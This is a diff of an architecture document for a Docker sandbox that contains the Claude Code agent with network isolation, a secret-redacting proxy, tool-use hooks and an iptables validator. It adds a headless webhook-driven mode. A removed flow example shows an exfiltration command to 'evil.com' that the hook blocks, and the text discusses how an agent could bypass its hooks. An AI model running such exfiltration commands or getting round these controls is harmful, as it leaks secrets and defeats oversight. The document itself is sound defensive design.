@@ -1,412 +1,586 @@
 # Architecture Research
 
-**Domain:** Docker-based CLI security isolation wrapper
-**Researched:** 2026-04-08
-**Confidence:** HIGH (architecture derived from detailed project spec + Docker/networking fundamentals)
+**Domain:** Headless agent mode integration for claude-secure
+**Researched:** 2026-04-11
+**Confidence:** HIGH
 
 ## System Overview
 
+### Current Architecture (v1.0)
+
 ```
-Host System
+HOST
  |
- |  docker compose up
- v
-+================================================================+
-|  Docker Compose Orchestration                                   |
-|                                                                 |
-|  INTERNAL NETWORK (claude-internal, no internet gateway)        |
-|  +----------------------------------------------------------+  |
-|  |                                                          |  |
-|  |  +-----------------+    +----------------+               |  |
-|  |  | claude          |    | validator      |               |  |
-|  |  | (Claude Code)   |--->| (Python HTTP   |               |  |
-|  |  |                 |    |  + iptables     |               |  |
-|  |  | Hooks: pre-     |    |  + SQLite)      |               |  |
-|  |  | tool-use.sh     |    | :8088/register |               |  |
-|  |  +---------+-------+    +----------------+               |  |
-|  |            |                                              |  |
-|  |            | ANTHROPIC_BASE_URL=http://proxy:8080         |  |
-|  |            v                                              |  |
-|  |  +-----------------+                                      |  |
-|  |  | proxy           |                                      |  |
-|  |  | (Node.js HTTP)  |----+                                 |  |
-|  |  | :8080           |    |                                 |  |
-|  |  +-----------------+    |                                 |  |
-|  |                         |                                 |  |
-|  +-------------------------|---------------------------------+  |
-|                            |                                    |
-|  EXTERNAL NETWORK          |  (claude-external, has gateway)    |
-|  +-------------------------|---------------------------------+  |
-|  |                         v                                 |  |
-|  |              api.anthropic.com                            |  |
-|  +-----------------------------------------------------------+  |
-+================================================================+
+ |  claude-secure --instance NAME
+ |       |
+ |       v
+ |  docker compose up -d
+ |  docker compose exec -it claude claude --dangerously-skip-permissions
+ |       |
+ |       v
+ |  +=======================================================+
+ |  |           claude-internal (internal: true)             |
+ |  |                                                        |
+ |  |  +----------+     +-----------+                        |
+ |  |  | claude   |<--->| validator |                        |
+ |  |  | (Ubuntu) |     | (Python)  |                        |
+ |  |  | hooks    |     | iptables  |                        |
+ |  |  +----+-----+     | SQLite   |                        |
+ |  |       |            +-----------+                       |
+ |  |       |          network_mode: service:claude          |
+ |  |       v                                                |
+ |  |  +----------+                                          |
+ |  |  |  proxy   |----> claude-external ---> internet       |
+ |  |  | (Node.js)|     (api.anthropic.com only)             |
+ |  |  +----------+                                          |
+ |  +=======================================================+
+ |
+ |  Config: ~/.claude-secure/instances/<name>/
+ |    - .env (secrets + auth)
+ |    - config.sh (WORKSPACE_PATH)
+ |    - whitelist.json (domains + placeholders)
 ```
 
-### Component Responsibilities
-
-| Component | Responsibility | Implementation | Container |
-|-----------|----------------|----------------|-----------|
-| **claude** | Runs Claude Code CLI in isolated network namespace; no direct internet | Node.js 20 + `@anthropic-ai/claude-code` npm package | `claude-secure` |
-| **proxy** | Intercepts all Claude-to-Anthropic traffic; redacts secrets outbound, restores placeholders inbound | Node.js `http`/`https` stdlib (no framework) | `claude-proxy` |
-| **validator** | Registers hook-signed call-IDs; enforces via iptables that only registered calls reach the network | Python stdlib `http.server` + SQLite + iptables | `claude-validator` |
-| **hooks** | PreToolUse script that intercepts Bash/WebFetch/WebSearch calls, checks domain whitelist, registers with validator | Bash + jq + uuidgen (read-only mounted) | Runs inside `claude` container |
-| **config** | Centralized whitelist (domain-to-secret mapping) and secret values | JSON whitelist + `.env` file (root-owned, read-only) | Mounted into relevant containers |
-
-## Recommended Project Structure
+### v2.0 Target Architecture (Headless Agent Mode)
 
 ```
-claude-secure/
-├── docker-compose.yml          # Orchestration: 3 services, 2 networks
-├── install.sh                  # Host installer (deps, auth, workspace, CLI shortcut)
-│
-├── claude/                     # Claude Code container
-│   ├── Dockerfile              # FROM node:20-slim, installs claude-code
-│   ├── settings.json           # Hook configuration (PreToolUse matcher)
-│   └── hooks/
-│       └── pre-tool-use.sh     # Domain check + validator registration
-│
-├── proxy/                      # Anthropic proxy container
-│   ├── Dockerfile              # FROM node:20-slim
-│   └── proxy.js                # HTTP proxy with secret redaction/restoration
-│
-├── validator/                  # Call validator container
-│   ├── Dockerfile              # FROM python:3.11-slim + iptables
-│   └── validator.py            # HTTP registration + SQLite + iptables rules
-│
-├── config/                     # Shared configuration (root-owned, read-only)
-│   ├── whitelist.json          # Secret-to-domain mapping + readonly domains
-│   └── .env                    # Actual secret values (chmod 400)
-│
-└── tests/                      # Integration tests
-    ├── test-blocked-call.sh    # Verify blocked scenarios
-    ├── test-allowed-call.sh    # Verify allowed scenarios
-    └── test-secret-redaction.sh # Verify proxy redaction
+HOST
+ |
+ |  +----------------------------+
+ |  | webhook-listener           |  <--- GitHub webhooks (port 9876)
+ |  | (systemd user service)     |
+ |  | Node.js http stdlib        |
+ |  +--------+-------------------+
+ |           |
+ |           | event dispatch (child_process.execFile)
+ |           v
+ |  +----------------------------+
+ |  | event-handler              |  Bash: map event -> profile + prompt
+ |  | (per-profile templates)    |
+ |  +--------+-------------------+
+ |           |
+ |           | claude-secure --profile <name> --headless "<prompt>"
+ |           v
+ |  +=======================================================+
+ |  |    Ephemeral Docker Compose Instance                   |
+ |  |    (COMPOSE_PROJECT_NAME=claude-hdls-<timestamp>)      |
+ |  |                                                        |
+ |  |  +----------+     +-----------+                        |
+ |  |  | claude   |<--->| validator |                        |
+ |  |  | -p mode  |     |           |                        |
+ |  |  | -T exec  |     |           |                        |
+ |  |  +----+-----+     +-----------+                        |
+ |  |       |                                                |
+ |  |  +----------+                                          |
+ |  |  |  proxy   |----> api.anthropic.com                   |
+ |  |  +----------+                                          |
+ |  +=======================================================+
+ |           |
+ |           | JSON result (stdout capture)
+ |           v
+ |  +----------------------------+
+ |  | report-writer              |  Parse JSON, format markdown,
+ |  | (Bash: jq + git)           |  git commit+push to docs repo
+ |  +----------------------------+
 ```
 
-### Structure Rationale
+## New vs Modified Components
 
-- **One directory per container:** Each service (`claude/`, `proxy/`, `validator/`) is self-contained with its own Dockerfile. This maps directly to Docker Compose build contexts and keeps concerns separated.
-- **Config at top level:** Shared configuration lives in `config/` and is volume-mounted read-only into containers that need it. Root ownership prevents Claude from modifying security policies.
-- **Hooks inside claude/:** Although hooks are mounted read-only at runtime, they live in the `claude/` build context because they execute inside that container. The Dockerfile copies them and sets `chmod 555`.
+### Component Inventory
 
-## Architectural Patterns
+| Component | Status | Location | Runtime |
+|-----------|--------|----------|---------|
+| webhook-listener | **NEW** | `listener/server.js` | Node.js (host process, systemd) |
+| profile-system | **NEW** | `~/.claude-secure/profiles/<name>/` | Config files (no runtime) |
+| event-handler | **NEW** | `listener/handlers/dispatch.sh` | Bash |
+| report-writer | **NEW** | `listener/report.sh` | Bash + jq + git |
+| bin/claude-secure | **MODIFIED** | `bin/claude-secure` | Bash (add ~80 lines) |
+| docker-compose.yml | **UNCHANGED** | `docker-compose.yml` | Already parameterized |
+| proxy | **UNCHANGED** | `proxy/` | Node.js stdlib |
+| validator | **UNCHANGED** | `validator/` | Python stdlib |
+| pre-tool-use.sh | **UNCHANGED** | `claude/hooks/` | Bash |
 
-### Pattern 1: Dual-Network Isolation
+### What Does NOT Change (and Why)
 
-**What:** Docker Compose defines two networks: `claude-internal` (marked `internal: true`, no default gateway to the host/internet) and `claude-external` (standard bridge with internet access). The claude and validator containers attach only to `internal`. The proxy container bridges both networks.
+| Component | Why Unchanged |
+|-----------|---------------|
+| `docker-compose.yml` | Already fully parameterized via env vars (WHITELIST_PATH, SECRETS_FILE, WORKSPACE_PATH, LOG_DIR, LOG_PREFIX). Profiles produce the same env vars instances do. |
+| `proxy/proxy.js` | Redacts based on whitelist.json content. Does not know or care whether the session is interactive or headless. |
+| `validator/validator.py` | Validates call-IDs from hooks. Works identically regardless of Claude's session type. |
+| `claude/hooks/pre-tool-use.sh` | Reads whitelist, registers with validator. Works in both interactive and `-p` mode since hooks fire on tool use regardless. |
+| `claude/Dockerfile` | Claude Code CLI already installed. `-p` flag is a runtime argument, not a build-time concern. |
 
-**When to use:** Whenever a container must communicate with peers but must not reach the internet directly. Docker's `internal: true` network flag removes the default gateway, making direct internet access impossible even if the container tries.
+## Detailed Component Designs
 
-**Trade-offs:**
-- PRO: Network isolation is enforced at the Docker daemon level, not by application code. Even if the claude process is compromised, it cannot reach the internet.
-- PRO: No iptables rules needed on the host to block the claude container.
-- CON: The proxy becomes a single point of failure -- if proxy is down, claude cannot reach Anthropic at all. This is acceptable (fail-closed is the desired behavior).
-- CON: DNS resolution inside the internal network is limited to container names. External DNS queries from the claude container will fail, which is intentional.
+### 1. Webhook Listener
 
-**Key configuration:**
-```yaml
-networks:
-  claude-internal:
-    internal: true       # No internet gateway
-  claude-external: {}    # Standard bridge, internet access
+**Location:** `listener/server.js`
+**Runtime:** Node.js `http` + `crypto` (stdlib only, matching project's zero-dependency pattern)
+**Deployment:** systemd user service
 
-services:
-  claude:
-    networks: [claude-internal]     # Isolated
-  proxy:
-    networks: [claude-internal, claude-external]  # Bridges both
-  validator:
-    networks: [claude-internal]     # Isolated
+**Why Node.js over Bash:** HMAC-SHA256 signature validation for GitHub webhooks requires `crypto.createHmac`. Pure Bash would need `openssl dgst` piped through `xxd` which is fragile and hard to get right. Node.js `crypto` is reliable, fast, and already available (required for Claude Code).
+
+**Why host-side, not containerized:** The listener must orchestrate Docker Compose instances (start, exec, stop). Running it inside Docker would require Docker-in-Docker or socket mounting, adding complexity and security risk. It also needs host-level access to profile configs and the docs repo for git push.
+
+**Responsibility:**
+1. Listen on configurable port (default 9876)
+2. Validate GitHub webhook HMAC signature
+3. Parse event type from `X-GitHub-Event` header
+4. Parse action from payload
+5. Route to event handler as subprocess
+6. Enforce concurrency limit (default: 2 simultaneous headless runs)
+
+**Key design: No framework needed.** The listener handles one route (`POST /webhook`) with HMAC validation. This is ~60 lines with `http.createServer`, matching the proxy's zero-dependency approach.
+
+```javascript
+// Sketch of core logic (not production code)
+const http = require('http');
+const crypto = require('crypto');
+const { execFile } = require('child_process');
+
+http.createServer((req, res) => {
+  // Validate HMAC
+  const sig = req.headers['x-hub-signature-256'];
+  const body = Buffer.concat(chunks);
+  const expected = 'sha256=' + crypto.createHmac('sha256', SECRET).update(body).digest('hex');
+  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) {
+    return res.writeHead(401).end();
+  }
+  // Dispatch
+  const event = req.headers['x-github-event'];
+  const payload = JSON.parse(body);
+  execFile('./handlers/dispatch.sh', [event, payload.action], {
+    env: { ...process.env, PAYLOAD_FILE: tmpFile }
+  });
+  res.writeHead(202).end('accepted');
+}).listen(PORT);
 ```
 
-### Pattern 2: Hook-Based Tool Interception
+### 2. Profile System
 
-**What:** Claude Code's `PreToolUse` hook mechanism invokes a shell script before every matching tool call. The script receives tool name and input as JSON on stdin, and uses its exit code to allow (0), block (2), or error. The hook is stateless -- invoked fresh each time, reads config on every call.
+**Location:** `~/.claude-secure/profiles/<service-name>/`
 
-**When to use:** When you need to intercept and gate CLI tool calls without modifying the CLI tool itself. The hook pattern is Claude Code-native, requires no monkey-patching.
+**How profiles map to existing config files:**
 
-**Trade-offs:**
-- PRO: No modification to Claude Code source. Uses official hook API.
-- PRO: Stateless per-invocation means whitelist changes take effect immediately.
-- CON: Hook runs in the same container as Claude Code. If Claude could overwrite the hook script, security is bypassed. Mitigation: root ownership + `chmod 555` + read-only volume mount.
-- CON: Hook cannot intercept what Claude sends to Anthropic via the normal conversation path (e.g., file contents read into context). That is the proxy's job.
+Profiles contain exactly what instance directories contain today, plus headless-specific additions. The key insight: profiles and instances produce identical Docker Compose environment variables, so docker-compose.yml needs zero changes.
 
-**Exit code contract:**
 ```
-Exit 0  = allow the tool call
-Exit 2  = block the tool call (Claude sees the block message on stderr)
-Exit 1  = error (tool call is blocked, error is reported)
+~/.claude-secure/profiles/
+  my-api-service/
+    whitelist.json        # Same format as instance whitelist.json
+    .env                  # Same format: auth token + service secrets
+    config.sh             # WORKSPACE_PATH + new headless vars:
+                          #   DOCS_REPO_PATH="/path/to/docs-repo"
+                          #   MAX_TURNS=50
+                          #   MAX_BUDGET_USD=2.00
+                          #   ALLOWED_TOOLS="Bash,Read,Write,Edit,Glob,Grep"
+                          #   MODEL=sonnet
+    prompt-templates/
+      issue.md            # Template: "Analyze {{ISSUE_TITLE}}..."
+      push.md             # Template: "Review changes in {{COMMITS}}..."
+      ci-failure.md       # Template: "Diagnose CI failure: {{LOG_URL}}..."
 ```
 
-### Pattern 3: Transparent Reverse Proxy with Bidirectional Secret Substitution
+**Profile-to-Docker-Compose mapping:**
 
-**What:** Claude Code is configured with `ANTHROPIC_BASE_URL=http://proxy:8080` so all Anthropic API requests route through the proxy. The proxy: (1) reads secret values from `.env` on every request, (2) replaces real secret values with placeholders in the outbound request body, (3) forwards to `api.anthropic.com`, (4) replaces placeholders back to real values in the response body.
+| Profile File | Docker Compose Variable | Mount Point |
+|-------------|------------------------|-------------|
+| `whitelist.json` | `WHITELIST_PATH=~/.claude-secure/profiles/X/whitelist.json` | `/etc/claude-secure/whitelist.json:ro` |
+| `.env` | `SECRETS_FILE=~/.claude-secure/profiles/X/.env` | `env_file` directive |
+| `config.sh` (WORKSPACE_PATH) | `WORKSPACE_PATH=/path/to/repo` | `/workspace` bind mount |
 
-**When to use:** When you need to sanitize data flowing between a client and an API without the client being aware. The bidirectional substitution ensures Claude can use secrets in tool calls (they are restored from placeholders in responses) while Anthropic never sees the real values.
+**Profile vs Instance coexistence:** Profiles live in `~/.claude-secure/profiles/`, instances in `~/.claude-secure/instances/`. They do not interfere. The CLI flag `--profile <name>` loads from profiles instead of instances. This avoids breaking existing interactive workflows.
 
-**Trade-offs:**
-- PRO: Claude Code requires zero modifications. It thinks it is talking to Anthropic directly.
-- PRO: Fresh config reload on every request means no restart needed after whitelist changes.
-- CON: Buffered mode (read full request, process, forward) adds latency. Not suitable for streaming SSE in Phase 1.
-- CON: String replacement is fragile if secrets appear in unexpected encodings (base64, URL-encoded). Phase 2 should add encoding-aware detection.
-- CON: Large request/response bodies consume memory. For typical Claude Code usage, this is not a concern (messages are text, not binary blobs).
+**Profile-to-repo lookup:** A config file maps repository names to profiles:
+```json
+// ~/.claude-secure/profiles/repo-map.json
+{
+  "myorg/my-api": "my-api-service",
+  "myorg/my-frontend": "my-frontend",
+  "myorg/*": "default-profile"
+}
+```
 
-### Pattern 4: HTTP-Registered iptables Enforcement
+### 3. Headless CLI Path (bin/claude-secure modification)
 
-**What:** The validator container runs two services: (1) an HTTP server on `:8088` that accepts call registration from the hook (receives call-ID, domain, PID, expiry), storing them in SQLite, and (2) iptables rules that block outbound traffic from the claude container unless a valid call-ID exists. The hook registers a call-ID before allowing a tool call. The validator checks for a valid, unexpired, unused call-ID for the target domain before allowing the packet through.
+The existing CLI wrapper needs a new code path triggered by `--headless` and `--profile` flags.
 
-**When to use:** When NFQUEUE/scapy kernel-level packet inspection is not available (e.g., WSL2 without kernel modules). The HTTP registration + iptables approach achieves equivalent validation without kernel dependencies.
+**Current interactive execution (line 342-348):**
+```bash
+mkdir -p "$LOG_DIR"
+chmod 777 "$LOG_DIR"
+cleanup_containers
+docker compose up -d
+docker compose exec -it claude claude --dangerously-skip-permissions
+```
 
-**Trade-offs:**
-- PRO: No kernel module dependencies. Works on WSL2 and standard Linux.
-- PRO: SQLite is zero-config, single-file, and provides ACID guarantees for the call registry.
-- CON: The validator container needs `NET_ADMIN` capability for iptables management.
-- CON: Call-IDs are time-limited (10 seconds) and single-use, creating a tight coupling between hook execution timing and actual network call timing. If Claude Code takes >10 seconds between hook approval and actual execution, the call fails. This is acceptable for security purposes.
+**New headless execution path:**
+```bash
+headless)
+  if [ -z "$HEADLESS_PROMPT" ]; then
+    echo "ERROR: --headless requires a prompt argument" >&2; exit 1
+  fi
+
+  # Generate ephemeral instance name
+  INSTANCE="hdls-$(date +%s)-$(head -c4 /dev/urandom | xxd -p)"
+  export COMPOSE_PROJECT_NAME="claude-${INSTANCE}"
+
+  mkdir -p "$LOG_DIR"
+  chmod 777 "$LOG_DIR"
+
+  # Start services
+  docker compose up -d
+
+  # Wait for proxy to be reachable
+  docker compose exec -T claude sh -c \
+    'for i in $(seq 1 30); do curl -sf http://proxy:8080/ >/dev/null 2>&1 && break; sleep 1; done'
+
+  # Run Claude headless (capture output to temp file)
+  RESULT_FILE=$(mktemp)
+  EXIT_CODE=0
+  docker compose exec -T claude claude -p "$HEADLESS_PROMPT" \
+    --output-format json \
+    --allowedTools "${ALLOWED_TOOLS:-Bash,Read,Write,Edit,Glob,Grep,WebSearch,WebFetch}" \
+    --max-turns "${MAX_TURNS:-50}" \
+    --max-budget-usd "${MAX_BUDGET_USD:-2.00}" \
+    --dangerously-skip-permissions \
+    --bare \
+    --no-session-persistence \
+    > "$RESULT_FILE" 2>"${RESULT_FILE}.err" || EXIT_CODE=$?
+
+  # Teardown
+  docker compose down --remove-orphans 2>/dev/null
+  docker volume rm "${COMPOSE_PROJECT_NAME}_validator-db" 2>/dev/null || true
+
+  # Output result
+  cat "$RESULT_FILE"
+  rm -f "$RESULT_FILE" "${RESULT_FILE}.err"
+  exit $EXIT_CODE
+  ;;
+```
+
+**Critical flags explained:**
+
+| Flag | Why Required |
+|------|-------------|
+| `-T` on `docker compose exec` | No TTY in headless/systemd context. Without this, Docker fails with "input device is not a TTY". The current interactive path uses `-it` which MUST NOT be used headless. |
+| `-p "prompt"` | Core non-interactive mode. Runs prompt and exits. |
+| `--output-format json` | Returns structured JSON with `result`, `total_cost_usd`, `duration_ms`, `num_turns`, `session_id`, `is_error`. Essential for report generation and cost tracking. |
+| `--allowedTools` | Security: restrict which tools headless Claude can use. Some profiles (review-only) may exclude Bash entirely. |
+| `--max-turns N` | Prevents runaway sessions. Default 50 is generous for most webhook tasks. |
+| `--max-budget-usd N` | Hard cost cap per invocation. Prevents accidental spending on a stuck agent. |
+| `--dangerously-skip-permissions` | Required for non-interactive mode -- no human to approve tool calls. This is safe because claude-secure's hook still enforces domain whitelisting. |
+| `--bare` | Skips auto-discovery of hooks, skills, MCP, CLAUDE.md from the filesystem. Faster startup, deterministic behavior. Note: claude-secure's hooks are mounted at a different path and configured via settings.json, so they still fire. |
+| `--no-session-persistence` | Ephemeral container -- no point persisting sessions to disk. |
+
+**Security note on --dangerously-skip-permissions + --allowedTools:**
+Using `--dangerously-skip-permissions` alone would be reckless outside claude-secure. But inside the Docker container, all four security layers are active: network isolation prevents direct internet access, the hook validates every tool call against the whitelist, the proxy redacts secrets, and the validator enforces iptables rules. Adding `--allowedTools` provides defense-in-depth by restricting WHICH tools Claude can invoke, while the hook restricts WHERE those tools can connect.
+
+### 4. Event Handler
+
+**Location:** `listener/handlers/dispatch.sh`
+
+**Event-to-action mapping:**
+
+| GitHub Event | Action Filter | Profile Source | Prompt Template |
+|-------------|---------------|----------------|-----------------|
+| `issues` | `opened`, `labeled` (label=claude) | `repo.full_name` lookup | `prompt-templates/issue.md` |
+| `push` | ref=`refs/heads/main` | `repo.full_name` lookup | `prompt-templates/push.md` |
+| `check_suite` | `completed` + conclusion=`failure` | `repo.full_name` lookup | `prompt-templates/ci-failure.md` |
+
+**Template substitution:** Prompt templates use shell-style variables that `envsubst` replaces from webhook payload fields:
+
+```markdown
+# prompt-templates/issue.md
+You are analyzing a GitHub issue for the ${REPO_NAME} project.
+
+## Issue #${ISSUE_NUMBER}: ${ISSUE_TITLE}
+
+${ISSUE_BODY}
+
+## Task
+1. Read the codebase to understand the relevant code
+2. Analyze the issue and propose an approach
+3. Write a detailed analysis report
+```
+
+### 5. Report Writer
+
+**Location:** `listener/report.sh`
+
+**Input:** JSON output from `claude -p --output-format json`
+
+**Output JSON structure (from official docs, HIGH confidence):**
+```json
+{
+  "type": "result",
+  "subtype": "success",
+  "result": "The full text response from Claude",
+  "total_cost_usd": 0.42,
+  "is_error": false,
+  "duration_ms": 45000,
+  "num_turns": 12,
+  "session_id": "abc-123"
+}
+```
+
+**Report format:**
+```markdown
+# [Event Type]: [Event Title]
+
+**Date:** 2026-04-11T14:30:00Z
+**Repository:** myorg/my-api
+**Event:** issues.opened #42
+**Cost:** $0.42 | **Turns:** 12 | **Duration:** 45s
+
+---
+
+[Claude's response text from result field]
+
+---
+*Generated by claude-secure headless agent*
+```
+
+**Commit to docs repo:**
+```bash
+DOCS_REPO_PATH="$HOME/docs-repo"  # from profile config.sh
+REPORT_DIR="$DOCS_REPO_PATH/reports/$(date +%Y-%m)"
+mkdir -p "$REPORT_DIR"
+# Write report
+echo "$REPORT_CONTENT" > "$REPORT_DIR/${TIMESTAMP}-${EVENT_TYPE}-${EVENT_ID}.md"
+# Commit and push
+cd "$DOCS_REPO_PATH"
+git add .
+git commit -m "report: ${EVENT_TYPE} ${REPO_NAME} #${EVENT_ID}"
+git push origin main
+```
 
 ## Data Flow
 
-### Flow 1: Claude Makes a Tool Call (Happy Path -- Whitelisted Domain)
+### Complete Webhook-to-Report Flow
 
 ```
-Claude Code (inside claude container)
-    |
-    | Claude decides to run: Bash("curl https://api.github.com/repos/...")
-    v
-PreToolUse Hook (pre-tool-use.sh)
-    |
-    | 1. Parse tool input JSON from stdin
-    | 2. Extract target URL -> api.github.com
-    | 3. Check whitelist.json -> api.github.com IS whitelisted
-    | 4. Check for file refs containing secrets -> none found
-    | 5. Generate call-ID (uuidgen)
-    | 6. POST to http://validator:8088/register
-    |    {id: "uuid", domain: "api.github.com", pid: "$$", expires: now+10s}
-    | 7. Validator stores in SQLite, returns 200
-    | 8. Exit 0 (allow)
-    v
-Claude Code executes the tool call
-    |
-    | curl https://api.github.com/repos/...
-    | (routed through validator's iptables rules)
-    v
-Validator (iptables check)
-    |
-    | 1. Look up call-ID for api.github.com in SQLite
-    | 2. Found valid, unexpired, unused entry
-    | 3. Mark call-ID as used
-    | 4. Allow packet through
-    v
-api.github.com (via claude-external network through proxy or direct)
+GitHub
+  |
+  |  POST /webhook (X-GitHub-Event: issues, X-Hub-Signature-256: sha256=...)
+  |
+  v
+webhook-listener (HOST, port 9876)
+  |
+  |  1. Validate HMAC-SHA256 signature
+  |  2. Parse event type + action
+  |  3. Check concurrency limit
+  |  4. Return 202 Accepted (async processing)
+  |
+  v
+dispatch.sh (HOST, subprocess)
+  |
+  |  5. Extract repo name from payload
+  |  6. Look up profile from repo-map.json
+  |  7. Load profile config.sh
+  |  8. Render prompt template with payload data
+  |
+  v
+claude-secure --profile my-api --headless "$PROMPT" (HOST, subprocess)
+  |
+  |  9. Export WHITELIST_PATH, SECRETS_FILE, WORKSPACE_PATH from profile
+  | 10. Generate ephemeral COMPOSE_PROJECT_NAME
+  | 11. docker compose up -d (starts claude, proxy, validator)
+  | 12. docker compose exec -T claude claude -p "$PROMPT" --output-format json ...
+  |
+  v
+DOCKER (claude-internal network)
+  |
+  | 13. Claude processes prompt using allowed tools
+  | 14. Hook validates each tool call (whitelist, call-ID registration)
+  | 15. Proxy redacts secrets in Anthropic API traffic
+  | 16. Validator enforces iptables per registered call-ID
+  | 17. Claude completes task, returns JSON result to stdout
+  |
+  v
+claude-secure (HOST, continues)
+  |
+  | 18. Capture JSON output
+  | 19. docker compose down --remove-orphans
+  | 20. Delete ephemeral instance config
+  |
+  v
+report.sh (HOST, subprocess)
+  |
+  | 21. Parse JSON result with jq
+  | 22. Format markdown report with metadata
+  | 23. Write to docs repo
+  | 24. git commit + git push
 ```
 
-### Flow 2: Claude Talks to Anthropic (Secret Redaction)
+### Profile Resolution Flow
 
 ```
-Claude Code
+Webhook payload { "repository": { "full_name": "myorg/my-api" } }
     |
-    | POST http://proxy:8080/v1/messages
-    | Body contains: "The GitHub token is ghp_xxxxxxxxxxxxxxxxxxxx"
     v
-Proxy (proxy.js)
+repo-map.json: "myorg/my-api" -> "my-api-service"
     |
-    | 1. Buffer full request body
-    | 2. Load secrets from .env + whitelist.json
-    | 3. Build substitution map: ghp_xxxx... -> PLACEHOLDER_GITHUB
-    | 4. Replace all occurrences in request body
-    | 5. Forward to https://api.anthropic.com/v1/messages
-    |    Body now contains: "The GitHub token is PLACEHOLDER_GITHUB"
     v
-api.anthropic.com
+~/.claude-secure/profiles/my-api-service/
     |
-    | Response: "Use PLACEHOLDER_GITHUB in the Authorization header"
-    v
-Proxy (proxy.js)
-    |
-    | 1. Buffer full response body
-    | 2. Reverse substitution: PLACEHOLDER_GITHUB -> ghp_xxxx...
-    | 3. Return to Claude Code
-    v
-Claude Code
-    | Sees: "Use ghp_xxxxxxxxxxxxxxxxxxxx in the Authorization header"
-    | Claude can now use the real token in tool calls
+    +-- whitelist.json    --> WHITELIST_PATH (mounted into proxy + claude)
+    +-- .env              --> SECRETS_FILE (env_file in compose) + sourced for auth
+    +-- config.sh         --> WORKSPACE_PATH, MAX_TURNS, MAX_BUDGET_USD, DOCS_REPO_PATH
+    +-- prompt-templates/
+         +-- issue.md     --> envsubst with ISSUE_TITLE, ISSUE_BODY, etc.
 ```
 
-### Flow 3: Claude Makes a Tool Call (Blocked -- Non-Whitelisted Domain with Payload)
+## Architectural Patterns
 
+### Pattern 1: Profile-as-Config (No New Containers)
+
+**What:** Profiles are purely a config-layer concept. They produce the same environment variables that instances produce today. No new Docker services, no docker-compose.yml changes.
+
+**When to use:** Always for headless mode.
+
+**Trade-offs:**
+- Pro: Reuses entire existing Docker Compose stack exactly as-is
+- Pro: Profile changes are immediate (no rebuild needed)
+- Pro: Testable: use profiles for interactive sessions too (`--profile X` instead of `--instance Y`)
+- Con: Profiles must be set up on the host before webhook events can be processed
+
+### Pattern 2: Ephemeral Instance Lifecycle
+
+**What:** Each headless invocation creates a unique COMPOSE_PROJECT_NAME, runs the task, captures output, tears down all containers, and removes ephemeral config. No state persists between runs.
+
+**When to use:** Every webhook-triggered headless run.
+
+**Trade-offs:**
+- Pro: Clean isolation between runs, no state leakage, no resource accumulation
+- Pro: Different runs can use different profiles with different secrets and whitelists
+- Con: Cold start penalty (~10-15s for docker compose up + service health). Acceptable for webhook tasks.
+- Con: Docker image layers are cached but container creation is not free
+
+### Pattern 3: CLI Subprocess, Not SDK
+
+**What:** The webhook listener spawns `claude-secure` as a subprocess, not via the Claude Agent SDK.
+
+**When to use:** Always for this project.
+
+**Why this is the only correct approach:** Using the Agent SDK (`claude-agent-sdk` package) directly from the host would run Claude on the host, completely bypassing all four security layers (Docker isolation, hooks, proxy redaction, iptables validation). The `-p` flag via `docker compose exec -T` is the correct integration point because Claude runs inside the security boundary.
+
+**Trade-offs:**
+- Pro: All security layers remain active. Identical security guarantees as interactive mode.
+- Pro: No new dependencies (no `claude-agent-sdk` npm/pip package needed on host)
+- Con: Subprocess output parsing via JSON stdout instead of native message objects
+- Con: Error handling is exit-code-based rather than exception-based
+
+### Pattern 4: Host-Side Orchestrator, Container-Side Agent
+
+**What:** The webhook listener runs on the host (systemd), while Claude runs inside Docker containers.
+
+**When to use:** Always -- this is the fundamental security boundary.
+
+**Network boundary visualization:**
 ```
-Claude Code
-    |
-    | Bash("curl -X POST -d 'secret=foo' https://evil.com/exfil")
-    v
-PreToolUse Hook
-    |
-    | 1. Extract URL -> evil.com
-    | 2. Check whitelist -> NOT whitelisted
-    | 3. Check for payload -> has -X POST -d (payload detected)
-    | 4. Log: "BLOCKED: Payload to non-whitelisted domain evil.com"
-    | 5. stderr: "Blocked: Payload not allowed to non-whitelisted domain evil.com"
-    | 6. Exit 2 (block)
-    v
-Claude Code sees block message, does not execute the call
+INTERNET <--[port 9876]--> webhook-listener (HOST)
+                                |
+                                | docker compose exec -T (Docker CLI)
+                                v
+                     Docker internal network (ISOLATED)
+                        claude <-> proxy <-> api.anthropic.com (external only)
+                        claude <-> validator (iptables enforcement)
 ```
 
-### Flow 4: Non-Whitelisted Domain, Read-Only (Allowed Without Signing)
-
-```
-Claude Code
-    |
-    | WebFetch("https://stackoverflow.com/questions/12345")
-    v
-PreToolUse Hook
-    |
-    | 1. Extract URL -> stackoverflow.com
-    | 2. Check whitelist -> NOT in secrets whitelist
-    | 3. Check for payload -> no payload (GET request)
-    | 4. Log: "ALLOWED (read-only): stackoverflow.com"
-    | 5. Exit 0 (allow, but NO call-ID registered)
-    v
-Claude Code executes the call
-    |
-    | (Note: iptables must allow read-only traffic to non-whitelisted
-    |  domains, or readonly_domains must be handled separately)
-```
-
-### Key Data Flows
-
-1. **Secret lifecycle:** Secrets live in `config/.env` (host) -> mounted read-only into proxy and validator containers -> proxy reads on each request -> redacted in outbound, restored in inbound. Claude never sees the `.env` file directly.
-
-2. **Call-ID lifecycle:** Generated by hook (uuidgen) -> registered via HTTP POST to validator -> stored in SQLite with 10-second TTL -> consumed (marked `used=1`) on first matching outbound connection -> expired entries cleaned up every 60 seconds.
-
-3. **Configuration lifecycle:** `whitelist.json` is read fresh on every hook invocation and every proxy request. Changes take effect immediately without container restarts.
-
-## Integration Points
-
-### External Services
-
-| Service | Integration Pattern | Notes |
-|---------|---------------------|-------|
-| api.anthropic.com | HTTP/HTTPS via proxy container | Only the proxy reaches Anthropic. Claude Code's `ANTHROPIC_BASE_URL` is overridden to point to the proxy. |
-| Whitelisted APIs (GitHub, Stripe, etc.) | Direct HTTPS from claude container via validator-gated iptables | Hook registers call-ID, validator allows matching outbound connections. |
-| Read-only domains (docs, StackOverflow) | Direct HTTPS from claude container | GET-only, no payload. Must be handled in iptables rules (allow or use readonly_domains list). |
-
-### Internal Boundaries
-
-| Boundary | Communication | Protocol | Notes |
-|----------|---------------|----------|-------|
-| claude -> proxy | HTTP (port 8080) | Proxy receives all Anthropic API traffic | Via `ANTHROPIC_BASE_URL` env var override |
-| claude (hook) -> validator | HTTP POST (port 8088) | `/register` endpoint for call-ID registration | Hook sends JSON payload with call-ID, domain, PID, expiry |
-| validator -> iptables | Local system calls | `iptables` commands from within validator container | Requires `NET_ADMIN` capability |
